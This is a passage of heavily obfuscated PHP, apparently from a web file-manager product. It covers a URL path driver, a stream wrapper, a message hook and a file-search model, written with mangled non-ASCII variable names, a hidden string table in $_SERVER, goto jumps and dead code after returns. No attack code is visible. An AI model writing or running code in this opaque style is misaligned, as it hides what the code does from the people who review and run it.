die; } } $ù¼Ğë‰¾ = 2; $•ößæµè = $¦†Àåö[784]; if (strlen($•ößæµè) < $¦†Àåö[679]) { die; } for ($¼ë‰«› = $Æ£€îêÅ; $¼ë‰«› > 1; $¼ë‰«›--) { $°…Ğ = !0; foreach ($ÙùòÍ as $‚Ì´Ç˜ù) { if ($¼ë‰«› % $‚Ì´Ç˜ù == 0) { $°…Ğ = !1; break; } } if ($°…Ğ) { $ù¼Ğë‰¾ = $¼ë‰«›; break; } } return $ù¼Ğë‰¾; $Èê°‘™î = $¦†Àåö[785]; if (strlen($Èê°‘™î) < $¦†Àåö[673]) { return; } } public function jnra7e19ef71($ß’ÃĞóÅ, $öî®“’ë) { $®‘“äú¨ =& $_SERVER[¤±ª…ß¤]; return call_user_func(array($®‘“äú¨[8], $®‘“äú¨[304]), $ß’ÃĞóÅ, $öî®“’ë); $Ğ€¬ç©Ú = $_SERVER[ò«¥Ê‡å][663]; if (!$Ğ€¬ç©Ú) { return; } } public function zxoa6757912c($Ü€£„ø¡, $¼û‹³¾Ñ) { $ˆÒ˜áÔŠ =& $_SERVER[¤±ª…ß¤]; return call_user_func(array($ˆÒ˜áÔŠ[305], $ˆÒ˜áÔŠ[306]), $Ü€£„ø¡, $¼û‹³¾Ñ); } public function evmx0090e8ea($ı­¶®ŒŠ, $ùøÈ¨©‹) { $îÒû®Ï¤ =& $_SERVER[¤±ª…ß¤]; return call_user_func(array($îÒû®Ï¤[305], $îÒû®Ï¤[307]), $ı­¶®ŒŠ, $ùøÈ¨©‹); $³Ü õ„á = $_SERVER[ò«¥Ê‡å][786]; if (!$³Ü õ„á) { return; } } } goto B²Š÷Ó¤; C’Ù»ªåƒÏ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¯ä÷óë = false) { } public function exist($ëôÚ¸ìî) { $…¢ËÜ¨• = $this->info($ëôÚ¸ìî); return $…¢ËÜ¨•[$_SERVER[ò«¥Ê‡å][218]]; } public function isFile($ºùÖ¶šé) { $µ¹¿õĞ‘ = $this->info($ºùÖ¶šé); return $µ¹¿õĞ‘[$_SERVER[ò«¥Ê‡å][218]]; } public function isFolder($®ÖñªùÃ) { return !1; } public function size($®·ÆÑ´Õ) { $¥½”ÒÚ¨ = $this->info($®·ÆÑ´Õ); return $¥½”ÒÚ¨[$_SERVER[ò«¥Ê‡å][78]]; } public function info($§©¢Š›ß) { return $this->infoParse($§©¢Š›ß); } public function infoAuth($Û‰”‚Æ) { return $this->infoParse($Û‰”‚Æ); } public function infoWithChildren($ìê­‚¾) { return $this->infoParse($ìê­‚¾); } public function infoFull($‹„“’¹») { return $this->infoParse($‹„“’¹»); } private function infoParse($©”Ÿ™) { $ÑÈôåè =& $_SERVER[ò«¥Ê‡å]; $‹„£Ú»Ñ = $this->header($©”Ÿ™); if (!$‹„£Ú»Ñ || !$‹„£Ú»Ñ[$ÑÈôåè[789]]) { return !1; } $½ãÈø = _get($‹„£Ú»Ñ, $ÑÈôåè[383], 0); $ù¿øëã = array($ÑÈôåè[32] => $‹„£Ú»Ñ[$ÑÈôåè[32]], $ÑÈôåè[86] => $©”Ÿ™, $ÑÈôåè[33] => $ÑÈôåè[216], $ÑÈôåè[78] => intval($½ãÈø), $ÑÈôåè[177] => get_path_ext($‹„£Ú»Ñ[$ÑÈôåè[32]]), $ÑÈôåè[1411] => $½ãÈø > 0 && $‹„£Ú»Ñ[$ÑÈôåè[1535]], $ÑÈôåè[1412] => !1); return $ù¿øëã; } private function header($Í¶‚µê›) { $›ĞğÒö˜ =& $_SERVER[ò«¥Ê‡å]; if (isset(self::$_cacheHeader[$Í¶‚µê›])) { return self::$_cacheHeader[$Í¶‚µê›]; } $¯ê£¡Ş¸ = isset($GLOBALS[$›ĞğÒö˜[1536]]) ? $GLOBALS[$›ĞğÒö˜[1536]] : !1; $GLOBALS[$›ĞğÒö˜[1536]] = !0; self::$_cacheHeader[$Í¶‚µê›] = url_header($Í¶‚µê›); $GLOBALS[$›ĞğÒö˜[1536]] = $¯ê£¡Ş¸; return self::$_cacheHeader[$Í¶‚µê›]; } public function hashSimple($áö¦½İâ, $ŒÙÀï = false) { $®½ü°ô =& $_SERVER[ò«¥Ê‡å]; $ìé¥¸ö¾ = $this->info($áö¦½İâ); if (!$ìé¥¸ö¾ || !$ìé¥¸ö¾[$®½ü°ô[218]]) { return !1; } $²Êúõò = $ìé¥¸ö¾[$®½ü°ô[78]]; $Åûè‹” = 200; $„‡ñ›¼ = 50; if ($²Êúõò <= $Åûè‹” * $„‡ñ›¼) { return md5($this->fileSubstr($áö¦½İâ, 0, $²Êúõò)) . $²Êúõò; } $©²ÈœªŞ = intval($²Êúõò / $„‡ñ›¼); $ë¿ÂóÜª = $®½ü°ô[12]; $§ù½ş„ö = timeFloat(); $Ïİ·ø´‘ = 15; for ($²ê¾ö»õ = 0; $²ê¾ö»õ < $„‡ñ›¼; $²ê¾ö»õ++) { if (timeFloat() - $§ù½ş„ö > $Ïİ·ø´‘) { return !1; } $Ë¿ñô½Ö = $this->fileSubstr($áö¦½İâ, $©²ÈœªŞ * $²ê¾ö»õ, $Åûè‹”); if (!$Ë¿ñô½Ö) { return !1; } $ë¿ÂóÜª .= $Ë¿ñô½Ö; } $ë¿ÂóÜª .= $this->fileSubstr($áö¦½İâ, $²Êúõò - $Åûè‹”, $Åûè‹”); return md5($ë¿ÂóÜª) . $²Êúõò; } public function getContent($×Î¨Ó´) { return $this->fileSubstr($×Î¨Ó´); } public function fileSubstr($¾ÉĞ€Ùı, $Û¨¾»ï = 0, $¡ÙÒÑà’ = -1) { $Ã³µñ®¸ =& $_SERVER[ò«¥Ê‡å]; $®â‹îÛ¤ = $this->info($¾ÉĞ€Ùı); if (!$®â‹îÛ¤ || !$®â‹îÛ¤[$Ã³µñ®¸[218]] && $®â‹îÛ¤[$Ã³µñ®¸[78]] > 1024 * 1024 * 10) { return !1; } if ($¡ÙÒÑà’ === -1) { $¡ÙÒÑà’ = $®â‹îÛ¤[$Ã³µñ®¸[78]]; } if ($¡ÙÒÑà’ == 0) { return $Ã³µñ®¸[12]; } $¹äÚò¨ô = array($Ã³µñ®¸[1537] . $Û¨¾»ï . $Ã³µñ®¸[821] . ($Û¨¾»ï + $¡ÙÒÑà’ - 1)); $Î†ñâ÷ì = url_request($¾ÉĞ€Ùı, $Ã³µñ®¸[247], !1, $¹äÚò¨ô, !1, !1, 30); return $Î†ñâ÷ì[$Ã³µñ®¸[1249]] ? $Î†ñâ÷ì[$Ã³µñ®¸[1249]] : $Ã³µñ®¸[12]; } public function download($¬®¬œ×, $íÉğ† Ÿ) { Downloader::start($¬®¬œ×, $íÉğ† Ÿ); return $íÉğ† Ÿ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÔÓëä†º, $İù•æÅ = '') { $this->info = $this->info($ÔÓëä†º); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ò«¥Ê‡å][86]]; $this->pathOpen = $ÔÓëä†º; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÔÓëä†º])) { self::$_chunkBuffer[$ÔÓëä†º] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($šƒ“¤Ó¿) { $äˆÌ“œÉ = $this->fileSubstr($this->pose, $šƒ“¤Ó¿); $this->pose += strlen($äˆÌ“œÉ); return $äˆÌ“œÉ; } public function stream_tell() { return $this->pose; } public function stream_seek($Æã«Ò”ç, $Ãó³ˆ£) { $™Û¶ğÁ® =& $_SERVER[ò«¥Ê‡å]; if ($Ãó³ˆ£ == SEEK_SET) { $this->pose = $Æã«Ò”ç; } else { if ($Ãó³ˆ£ == SEEK_CUR) { $this->pose += $Æã«Ò”ç; } else { if ($Ãó³ˆ£ == SEEK_END) { $this->pose = $this->info[$™Û¶ğÁ®[78]] + intval($Æã«Ò”ç); } } } if ($Æã«Ò”ç < 0) { $this->pose = $this->info[$™Û¶ğÁ®[78]] + $Æã«Ò”ç; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ò«¥Ê‡å][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($œ²Ùû¡õ, $ÍùØ›‰×) { $Ä«Æ§§¸ =& $_SERVER[ò«¥Ê‡å]; $¢¼¯´‰ì = $this->info($œ²Ùû¡õ); return array($Ä«Æ§§¸[1538] => 0, $Ä«Æ§§¸[1539] => 0, $Ä«Æ§§¸[16] => 32768 + 511, $Ä«Æ§§¸[1540] => 0, $Ä«Æ§§¸[1541] => 0, $Ä«Æ§§¸[1542] => 0, $Ä«Æ§§¸[1543] => 0, $Ä«Æ§§¸[78] => $¢¼¯´‰ì[$Ä«Æ§§¸[78]], $Ä«Æ§§¸[1544] => $¢¼¯´‰ì[$Ä«Æ§§¸[1410]], $Ä«Æ§§¸[1500] => $¢¼¯´‰ì[$Ä«Æ§§¸[87]], $Ä«Æ§§¸[1499] => $¢¼¯´‰ì[$Ä«Æ§§¸[217]], $Ä«Æ§§¸[1545] => 0, $Ä«Æ§§¸[1546] => 0); } static $fileInfo = array(); public function info($É™Îá£Ú) { $´±§Ê‰â = $_SERVER[ò«¥Ê‡å][1547]; if (isset(self::$fileInfo[$É™Îá£Ú])) { return self::$fileInfo[$É™Îá£Ú]; } if (substr($É™Îá£Ú, 0, strlen($´±§Ê‰â)) != $´±§Ê‰â) { return !1; } self::$fileInfo[$É™Îá£Ú] = IO::info(substr($É™Îá£Ú, strlen($´±§Ê‰â))); return self::$fileInfo[$É™Îá£Ú]; } public static function read($·ÑãËß“, $ğ·Ûé©™, $å…àõáŠ) { if (!isset(self::$_fopenCache[$·ÑãËß“])) { $‚ÜíÃÂÏ = new StreamWrapperIO(); $‚ÜíÃÂÏ->stream_open($·ÑãËß“); self::$_fopenCache[$·ÑãËß“] = $‚ÜíÃÂÏ; } $‚ÜíÃÂÏ = self::$_fopenCache[$·ÑãËß“]; return $‚ÜíÃÂÏ->fileSubstr($ğ·Ûé©™, $å…àõáŠ); } public static function _read($ÔäÈ½È, $…‰’¥ø, $À÷Ï€Å) { $°¾ºÚ‚« =& $_SERVER[ò«¥Ê‡å]; $™ÛÃ…ıŠ = fopen($ÔäÈ½È, $°¾ºÚ‚«[1414]); if (!$™ÛÃ…ıŠ) { return $°¾ºÚ‚«[12]; } $ø£äÇ‡ = 8192; fseek($™ÛÃ…ıŠ, $…‰’¥ø, SEEK_SET); $ôí›Âû = $°¾ºÚ‚«[12]; $•—ò´ÔÔ = 0; while ($•—ò´ÔÔ < $À÷Ï€Å) { $Ûûú®®á = min($ø£äÇ‡, $À÷Ï€Å - $•—ò´ÔÔ); $ôí›Âû .= fread($™ÛÃ…ıŠ, $Ûûú®®á); $•—ò´ÔÔ += $Ûûú®®á; } fclose($™ÛÃ…ıŠ); return $ôí›Âû; } public function fileSubstr($ø•êüŠ¨, $Ìğí¨£´) { $Íµ­“€‚ =& $_SERVER[ò«¥Ê‡å]; $³Üö­‰‰ = $this->info[$Íµ­“€‚[78]]; $¡øóûƒ = $ø•êüŠ¨; $‚Ìû÷„‘ = $Ìğí¨£´; if ($ø•êüŠ¨ < 0) { $ø•êüŠ¨ = $³Üö­‰‰ + $ø•êüŠ¨; } if ($Ìğí¨£´ === !1) { $Ìğí¨£´ = $³Üö­‰‰ - $ø•êüŠ¨; } if ($ø•êüŠ¨ + $Ìğí¨£´ > $³Üö­‰‰) { $Ìğí¨£´ = $³Üö­‰‰ - $ø•êüŠ¨; } if ($Ìğí¨£´ <= 0) { return $Íµ­“€‚[12]; } if ($ø•êüŠ¨ < 0 || $ø•êüŠ¨ >= $³Üö­‰‰ || $Ìğí¨£´ <= 0 || $Ìğí¨£´ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\154\x65\122\145\x61\144\40\x65\162\162\157\162\41\40\x73\x74\x61\162\x74\75{$ø•êüŠ¨}\73\x6c\145\x6e\147\x74\x68\x3d{$Ìğí¨£´}\x3b\40\163\151\172\145\75{$³Üö­‰‰}\x3b"); } $ı•Ş“âÛ = 64 * 1024; $×‡”ğ =& self::$_chunkBuffer[$this->path]; if (!$×‡”ğ) { $×‡”ğ = array(); } $Éı­¦–Á = 0; $‡ˆ˜ø“Ù = 0; $ºË‹ìß‡ = $Íµ­“€‚[12]; foreach ($×‡”ğ as $Éı­¦–Á => $ºË‹ìß‡) { $Éı­¦–Á = intval($Éı­¦–Á); $‡ˆ˜ø“Ù = $Éı­¦–Á + strlen($ºË‹ìß‡); if ($ø•êüŠ¨ >= $‡ˆ˜ø“Ù) { continue; } if ($ø•êüŠ¨ >= $Éı­¦–Á && $ø•êüŠ¨ + $Ìğí¨£´ <= $‡ˆ˜ø“Ù) { return substr($ºË‹ìß‡, $ø•êüŠ¨ - $Éı­¦–Á, $Ìğí¨£´); } break; } if (count($×‡”ğ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Íµ­“€‚[1548], $Íµ­“€‚[1549] . count($×‡”ğ) . "\73\x73\x74\141\162\164\75{$ø•êüŠ¨}\54\x6c\145\156\x67\164\150\x3d{$Ìğí¨£´}\73\x70\x6f\x73\145\x3a{$Éı­¦–Á}\x7e{$‡ˆ˜ø“Ù}"); throw new Exception($Íµ­“€‚[1550]); } $€¤¤ú×ò = intval($ø•êüŠ¨ / $ı•Ş“âÛ) * $ı•Ş“âÛ; $éÍë¹ş = ceil(($ø•êüŠ¨ + $Ìğí¨£´) / $ı•Ş“âÛ) * $ı•Ş“âÛ - $€¤¤ú×ò; $ÇÏ³àüÚ = IO::fileSubstr($this->path, $€¤¤ú×ò, $éÍë¹ş); $×‡”ğ[$€¤¤ú×ò . $Íµ­“€‚[12]] = $ÇÏ³àüÚ; ksort($×‡”ğ); $î¨é—Åñ = substr($ÇÏ³àüÚ, $ø•êüŠ¨ - $€¤¤ú×ò, $Ìğí¨£´); return $î¨é—Åñ; } private function log($±–åÍê, $„¾Ï·âå) { $¤°Ï›ë¾ =& $_SERVER[ò«¥Ê‡å]; $£ÎÈá½ª = timeFloat() - $this->timeStart; write_log(sprintf($¤°Ï›ë¾[1551], $±–åÍê, $this->info[$¤°Ï›ë¾[32]], $£ÎÈá½ª, $„¾Ï·âå), $¤°Ï›ë¾[1229]); } } class Message { function __construct() { } public function send($°ß« »ô = '', $âåÜ¿Óñ = array(), $«½ãƒ—Ø = "\x74\x65\170\164") { $Ãû‚ÚÔ =& $_SERVER[ò«¥Ê‡å]; $û•®‰·„ = array($Ãû‚ÚÔ[33] => $Ãû‚ÚÔ[1552], $Ãû‚ÚÔ[793] => $°ß« »ô); if (in_array($«½ãƒ—Ø, array($Ãû‚ÚÔ[1552], $Ãû‚ÚÔ[1553]))) { $û•®‰·„[$Ãû‚ÚÔ[33]] = $«½ãƒ—Ø; } $âåÜ¿Óñ = array($Ãû‚ÚÔ[549] => isset($âåÜ¿Óñ[$Ãû‚ÚÔ[549]]) ? $âåÜ¿Óñ[$Ãû‚ÚÔ[549]] : $Ãû‚ÚÔ[12], $Ãû‚ÚÔ[632] => isset($âåÜ¿Óñ[$Ãû‚ÚÔ[632]]) ? $âåÜ¿Óñ[$Ãû‚ÚÔ[632]] : $Ãû‚ÚÔ[12]); if (empty($°ß« »ô) || empty($âåÜ¿Óñ[$Ãû‚ÚÔ[549]]) && empty($âåÜ¿Óñ[$Ãû‚ÚÔ[632]])) { return !1; } $Ô“·¦ùÙ = array($Ãû‚ÚÔ[1493] => $û•®‰·„, $Ãû‚ÚÔ[1554] => $âåÜ¿Óñ); Hook::trigger($Ãû‚ÚÔ[1555], $Ô“·¦ùÙ); } } goto fØ¸Ò¡Î»ù; dÈô×¡•: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÌÃë¬ ) { $ÎÙîÕ± =& $_SERVER[ò«¥Ê‡å]; $Òøı¸½Ï = KodIO::fileTypeList(); $¡öüÏéò = $Òøı¸½Ï[$ÌÃë¬ ]; if (!$¡öüÏéò) { return array(); } $¦ì„¿á = $¡öüÏéò[$ÎÙîÕ±[177]]; $«Õ¤²¦ = $ÎÙîÕ±[7]; if (!$¡öüÏéò[$ÎÙîÕ±[177]]) { $ÄøËÇ×¯ = array_to_keyvalue($Òøı¸½Ï, $ÎÙîÕ±[12], $ÎÙîÕ±[177]); $¦ì„¿á = implode($ÎÙîÕ±[50], $ÄøËÇ×¯); $«Õ¤²¦ = $ÎÙîÕ±[2156]; } $úŒœğƒ¨ = explode($ÎÙîÕ±[50], trim($¦ì„¿á, $ÎÙîÕ±[50])); return array($«Õ¤²¦, $úŒœğƒ¨); } public function listPathType($éÈåÂ§§) { $²âÂĞ°Í =& $_SERVER[ò«¥Ê‡å]; $ğâ¨ûÜò = $this->fileTypeWhere($éÈåÂ§§); if (!$ğâ¨ûÜò) { return array(); } $­¦“‰ º = USER_ID; $Ã¢Œğ§ = Model($²âÂĞ°Í[569])->getInfo($­¦“‰ º); $Ì³ïÕ‡Ë = array($²âÂĞ°Í[618] => SourceModel::TYPE_USER, $²âÂĞ°Í[555] => array($²âÂĞ°Í[582], $²âÂĞ°Í[565] . $Ã¢Œğ§[$²âÂĞ°Í[89]][$²âÂĞ°Í[183]] . $²âÂĞ°Í[583]), $²âÂĞ°Í[619] => $­¦“‰ º, $²âÂĞ°Í[616] => 0, $²âÂĞ°Í[617] => $ğâ¨ûÜò); return $this->listSource($Ì³ïÕ‡Ë); } public function listSearch($¼üÛĞÔ–, $ìÈÙ¼Œ‹ = 300) { $•´¥ÈãÉ =& $_SERVER[ò«¥Ê‡å]; if (isset($¼üÛĞÔ–[$•´¥ÈãÉ[1993]]) && $¼üÛĞÔ–[$•´¥ÈãÉ[1993]]) { $¼üÛĞÔ–[$•´¥ÈãÉ[1993]] = str_replace($•´¥ÈãÉ[430], $•´¥ÈãÉ[2157], trim($¼üÛĞÔ–[$•´¥ÈãÉ[1993]])); } $±İ®ÇÕì = $this->_parseSearchWhere($¼üÛĞÔ–); if (!isset($±İ®ÇÕì[$•´¥ÈãÉ[475]])) { $±İ®ÇÕì[$•´¥ÈãÉ[475]] = 0; } $ÔÎÉªà¼ = $•´¥ÈãÉ[2158]; $»ûºË± = $±İ®ÇÕì; $¿­İùÆœ = $ÔÎÉªà¼; $this->_listSearchBindPinyin($¼üÛĞÔ–, $±İ®ÇÕì, $ÔÎÉªà¼); $this->alias($•´¥ÈãÉ[489])->_makeOrder(); $±İ®ÇÕì = $this->parseWhereLike($±İ®ÇÕì); $òó·Ô™Ø = $this->distinct(!0)->field($ÔÎÉªà¼)->where($±İ®ÇÕì)->selectPage($ìÈÙ¼Œ‹); if ($GLOBALS[$•´¥ÈãÉ[6]][$•´¥ÈãÉ[427]][$•´¥ÈãÉ[428]] && Input::check($¼üÛĞÔ–[$•´¥ÈãÉ[1993]], $•´¥ÈãÉ[625]) && $òó·Ô™Ø[$•´¥ÈãÉ[412]][$•´¥ÈãÉ[399]] == 1 && $òó·Ô™Ø[$•´¥ÈãÉ[412]][$•´¥ÈãÉ[413]] == 0) { $òó·Ô™Ø = $this->distinct(!0)->field($ÔÎÉªà¼)->where($»ûºË±)->limit(1000)->select(); $òó·Ô™Ø = array_page_split($òó·Ô™Ø, !1, $ìÈÙ¼Œ‹); } $this->_listSearchFileContent($òó·Ô™Ø, $¼üÛĞÔ–, $¿­İùÆœ, $»ûºË±); $this->_listSearchDesc($òó·Ô™Ø, $¼üÛĞÔ–, $¿­İùÆœ); $this->_listSearchTag($òó·Ô™Ø, $¼üÛĞÔ–, $¿­İùÆœ); $this->_listSearchGroupTag($òó·Ô™Ø, $¼üÛĞÔ–, $¿­İùÆœ); $this->_listDataApply($òó·Ô™Ø[$•´¥ÈãÉ[415]]); $this->_listMake($òó·Ô™Ø); return $òó·Ô™Ø; } private function _listSearchFileContent(&$™õîèğÚ, $È¦¥²¿‚, $Ö‘­Ş‰¼, $öÇ•Éùö) { $±âÉ¥–± =& $_SERVER[ò«¥Ê‡å]; if (!$È¦¥²¿‚[$±âÉ¥–±[1993]] || $™õîèğÚ[$±âÉ¥–±[412]][$±âÉ¥–±[399]] > 1) { return; } if (!isset($öÇ•Éùö[$±âÉ¥–±[32]]) || !is_array($È¦¥²¿‚[$±âÉ¥–±[511]])) { return; } $öÇ•Éùö[$±âÉ¥–±[511]] = array($±âÉ¥–±[7], $È¦¥²¿‚[$±âÉ¥–±[511]]); unset($öÇ•Éùö[$±âÉ¥–±[32]]); unset($È¦¥²¿‚[$±âÉ¥–±[511]]); $í†¿Ÿè = $this->field($Ö‘­Ş‰¼)->where($öÇ•Éùö)->limit($±âÉ¥–±[2159])->select(); if (!$í†¿Ÿè || count($í†¿Ÿè) == 0) { return; } $™õîèğÚ[$±âÉ¥–±[415]] = array_merge($í†¿Ÿè, $™õîèğÚ[$±âÉ¥–±[415]]); $™õîèğÚ[$±âÉ¥–±[412]][$±âÉ¥–±[413]] += count($í†¿Ÿè); } private function _listSearchTag(&$ØûÑé•å, $ß”ª“ìÄ, $Æšª ñ©) { $„¨•¬ß‰ =& $_SERVER[ò«¥Ê‡å]; if (!$ß”ª“ìÄ[$„¨•¬ß‰[1993]] || $ØûÑé•å[$„¨•¬ß‰[412]][$„¨•¬ß‰[399]] > 1) { return; } $¬äï¶› = Model($„¨•¬ß‰[2160])->listData(); $´ãÊÕç = array(); $®¦„¿è– = $ß”ª“ìÄ[$„¨•¬ß‰[1993]]; foreach ($¬äï¶› as $£ê€»ú¬) { $ ¾ŠªÛ¼ = $£ê€»ú¬[$„¨•¬ß‰[32]]; $ÕÑ¼©Š = str_replace($„¨•¬ß‰[53], $„¨•¬ß‰[12], Pinyin::get($ ¾ŠªÛ¼)); if (stripos($ ¾ŠªÛ¼, $®¦„¿è–) !== !1 || stripos($ÕÑ¼©Š, $®¦„¿è–) !== !1) { $´ãÊÕç[] = $£ê€»ú¬[$„¨•¬ß‰[445]]; } } if (!$´ãÊÕç) { return; } $ï…÷ºõ… = array($„¨•¬ß‰[470] => array($„¨•¬ß‰[7], $´ãÊÕç), $„¨•¬ß‰[1701] => USER_ID); $©äçıŸ¼ = Model($„¨•¬ß‰[472])->field($„¨•¬ß‰[86])->where($ï…÷ºõ…)->select(); $©äçıŸ¼ = array_to_keyvalue($©äçıŸ¼, $„¨•¬ß‰[12], $„¨•¬ß‰[86]); $Š·Ùñ˜ = array_unique($©äçıŸ¼); $this->_listSearchMerge($ØûÑé•å, $ß”ª“ìÄ, $Æšª ñ©, $Š·Ùñ˜); } private function _listSearchDesc(&$î´„úæÚ, $ùÛêİµÔ, $¢õª•ıî) { $¤¦µ™—  =& $_SERVER[ò«¥Ê‡å]; if (!$ùÛêİµÔ[$¤¦µ™— [1993]] || $î´„úæÚ[$¤¦µ™— [412]][$¤¦µ™— [399]] > 1) { return; } $öò·æİ = array($¤¦µ™— [96] => $¤¦µ™— [496], $¤¦µ™— [420] => array($¤¦µ™— [429], $¤¦µ™— [1995] . $ùÛêİµÔ[$¤¦µ™— [1993]] . $¤¦µ™— [1995])); $Àâğ“”É = !1; if ($Àâğ“”É) { $±è²Üé = $this->listSearchChildren($ùÛêİµÔ[$¤¦µ™— [182]]); $±è²Üé = array_unique($±è²Üé); if (!$±è²Üé) { return; } $öò·æİ[$¤¦µ™— [183]] = array($¤¦µ™— [7], $±è²Üé); } $‚§“¬Ó¢ = Model($¤¦µ™— [602])->field($¤¦µ™— [183])->where($öò·æİ)->limit(5000)->select(); $Ş÷Ü¾ÁŞ = array_to_keyvalue($‚§“¬Ó¢, $¤¦µ™— [12], $¤¦µ™— [183]); $this->_listSearchMerge($î´„úæÚ, $ùÛêİµÔ, $¢õª•ıî, $Ş÷Ü¾ÁŞ); } private function _listSearchGroupTag(&$Ü¢Ì—ñ¹, $…‘àÏÊ, $ù§„±ù€) { $»ö×á¹ =& $_SERVER[ò«¥Ê‡å]; if (!$…‘àÏÊ[$»ö×á¹[1993]] || $Ü¢Ì—ñ¹[$»ö×á¹[412]][$»ö×á¹[399]] > 1 || !$…‘àÏÊ[$»ö×á¹[182]]) { return; } $ãş°¿Éò = $this->sourceInfo($…‘àÏÊ[$»ö×á¹[182]]); if (!$ãş°¿Éò || $ãş°¿Éò[$»ö×á¹[180]] != SourceModel::TYPE_GROUP) { return; } $Ú®é•‹Œ = $ãş°¿Éò[$»ö×á¹[540]]; $ôàè‚©© = Model($»ö×á¹[2161])->get($Ú®é•‹Œ); $†Û´²İ = array(); $÷³ãŞß² = $…‘àÏÊ[$»ö×á¹[1993]]; foreach ($ôàè‚©©[$»ö×á¹[415]] as $ªÅÛ“ñ) { $…îù³– = $ªÅÛ“ñ[$»ö×á¹[32]]; $à…”Êë‹ = str_replace($»ö×á¹[53], $»ö×á¹[12], Pinyin::get($…îù³–)); if (stripos($…îù³–, $÷³ãŞß²) !== !1 || stripos($à…”Êë‹, $÷³ãŞß²) !== !1) { $†Û´²İ[] = $ªÅÛ“ñ[$»ö×á¹[445]]; } } if (!$†Û´²İ) { return; } $öŠö§µµ = array($»ö×á¹[470] => array($»ö×á¹[7], $†Û´²İ), $»ö×á¹[1701] => 0, $»ö×á¹[33] => $»ö×á¹[2015] . $Ú®é•‹Œ); $Ø£¹…‡ = Model($»ö×á¹[472])->field($»ö×á¹[86])->where($öŠö§µµ)->select(); $Ø£¹…‡ = array_to_keyvalue($Ø£¹…‡, $»ö×á¹[12], $»ö×á¹[86]); $‹ÁÜÕºÔ = array_unique($Ø£¹…‡); $this->_listSearchMerge($Ü¢Ì—ñ¹, $…‘àÏÊ, $ù§„±ù€, $‹ÁÜÕºÔ); } private function _listSearchMerge(&$ß¶§‰ÉÚ, $Íò¾´ƒÏ, $ı¶ªÉË¨, $¦Â¹‘õª) { $ı¥îÀ—ñ =& $_SERVER[ò«¥Ê‡å]; if (!$¦Â¹‘õª) { return; } $Âœ¾¨Äæ = array_to_keyvalue($ß¶§‰ÉÚ[$ı¥îÀ—ñ[415]], $ı¥îÀ—ñ[12], $ı¥îÀ—ñ[183]); $œè¡’„Ç = array_diff($¦Â¹‘õª, $Âœ¾¨Äæ); if (!$œè¡’„Ç) { return; } $ØÔéºä = array($ı¥îÀ—ñ[183] => array($ı¥îÀ—ñ[7], $œè¡’„Ç)); $ú©šõ»ˆ = $this->field($ı¶ªÉË¨)->where($ØÔéºä)->select(); if (!$ú©šõ»ˆ) { return; } $ÕÂÇÔª = array(); foreach ($ú©šõ»ˆ as $•¹íÒË) { if ($this->_listSearchFilter($•¹íÒË, $Íò¾´ƒÏ)) { $ÕÂÇÔª[] = $•¹íÒË; } } $ß¶§‰ÉÚ[$ı¥îÀ—ñ[415]] = array_merge($ÕÂÇÔª, $ß¶§‰ÉÚ[$ı¥îÀ—ñ[415]]); $ß¶§‰ÉÚ[$ı¥îÀ—ñ[412]][$ı¥îÀ—ñ[413]] += count($ÕÂÇÔª); } private function _listSearchFilter($‡Çª‡„ç, $¶˜…“ã) { $æš™Ø£ª =& $_SERVER[ò«¥Ê‡å]; $¡§·ÇªÒ = $‡Çª‡„ç[$æš™Ø£ª[455]] == $æš™Ø£ª[90]; if (!strstr($‡Çª‡„ç[$æš™Ø£ª[555]], $æš™Ø£ª[50] . $¶˜…“ã[$æš™Ø£ª[182]] . $æš™Ø£ª[50])) { return !1; } if (isset($¶˜…“ã[$æš™Ø£ª[456]]) && $¶˜…“ã[$æš™Ø£ª[456]] != $æš™Ø£ª[1954]) { if ($¶˜…“ã[$æš™Ø£ª[456]] == $æš™Ø£ª[77] && !$¡§·ÇªÒ) { return !1; } if ($¶˜…“ã[$æš™Ø£ª[456]] != $æš™Ø£ª[77] && $¡§·ÇªÒ) { return !1; } if (!strstr($‡Çª‡„ç[$æš™Ø£ª[177]], $æš™Ø£ª[50] . $¶˜…“ã[$æš™Ø£ª[456]] . $æš™Ø£ª[50])) { return !1; } } if (isset($¶˜…“ã[$æš™Ø£ª[2162]]) && $¶˜…“ã[$æš™Ø£ª[2162]] < $‡Çª‡„ç[$æš™Ø£ª[78]]) { return !1; } if (isset($¶˜…“ã[$æš™Ø£ª[2163]]) && $¶˜…“ã[$æš™Ø£ª[2163]] > $‡Çª‡„ç[$æš™Ø£ª[78]]) { return !1; } if (isset($¶˜…“ã[$æš™Ø£ª[632]]) && $¶˜…“ã[$æš™Ø£ª[632]] != $‡Çª‡„ç[$æš™Ø£ª[499]]) { return !1; } return !0; } public function listSearchChildren($¯ô×ÉÂş, $öÙÛàò = 5000) { $æä£¦Ï¶ =& $_SERVER[ò«¥Ê‡å]; $Ñ †¸—¹ = array(); $¨ÎÎÛüß = $this->sourceInfo($¯ô×ÉÂş); $€ùáÑæõ = array($æä£¦Ï¶[555] => array($æä£¦Ï¶[429], $¨ÎÎÛüß[$æä£¦Ï¶[555]] . $¨ÎÎÛüß[$æä£¦Ï¶[183]] . $æä£¦Ï¶[583])); $ÑËêúÖ€ = $this->field($æä£¦Ï¶[78])->where($€ùáÑæõ)->limit($öÙÛàò + 1)->select(); $‡æè¨¡‹ = is_array($ÑËêúÖ€) ? count($ÑËêúÖ€) : 0; if ($‡æè¨¡‹ > $öÙÛàò) { return $this->_listSearchChildrenNear($¯ô×ÉÂş, $öÙÛàò); } $æø„éùÛ = $this->field($æä£¦Ï¶[183])->where($€ùáÑæõ)->select(); $Ñ †¸—¹ = array_to_keyvalue($æø„éùÛ, $æä£¦Ï¶[12], $æä£¦Ï¶[183]); return $Ñ †¸—¹; } private function _listSearchChildrenNear($ïßù×®û, $Ù™ëëî®) { $‚ƒ°ö‰Ø =& 